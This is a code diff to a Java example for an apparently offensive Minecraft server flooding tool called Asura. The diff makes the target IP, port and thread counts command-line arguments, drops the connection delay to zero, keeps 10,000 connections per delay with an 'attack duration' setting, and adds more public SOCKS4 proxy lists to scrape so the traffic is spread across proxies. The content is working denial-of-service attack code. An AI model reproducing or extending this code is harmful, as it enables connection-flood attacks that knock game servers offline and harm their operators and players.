@@ -25,16 +25,16 @@ public class AsuraExample {
      */
 
     public static void main(String[] args) {
-        String srvIP = "51.89.42.211";
-        int port = 25565;
+        String srvIP = args[0];
+        int port = Integer.parseInt(args[1]);
         IMethod method = new Join();
 
         // setup nettybootstrap
         NettyBootstrap bootstrap = new NettyBootstrap.Builder(method, srvIP, port)
-                .connectLoopThreads(3)
-                .workerThreads(10)
+                .connectLoopThreads(Integer.parseInt(args[2]))
+                .workerThreads(Integer.parseInt(args[3]))
                 .proxyType(ProxyType.SOCKS4)
-                .delay(1) //in ms
+                .delay(0) //in ms
                 .perDelay(10000) // connections per delay
                 .duration(10000) //attack duration
                 .protocolID(760) //miecraft version protocol id
@@ -67,6 +67,9 @@ public class AsuraExample {
         ArrayList<String> urls = new ArrayList<>();
         //now add all urls u want to scrape proxyes from in this list
         urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt");
+        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt");
+        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt");
+
         ArrayList<Proxy> proxies = new ArrayList<>();
         try {
             ProxyScraper scraper = new ProxyScraper(urls);
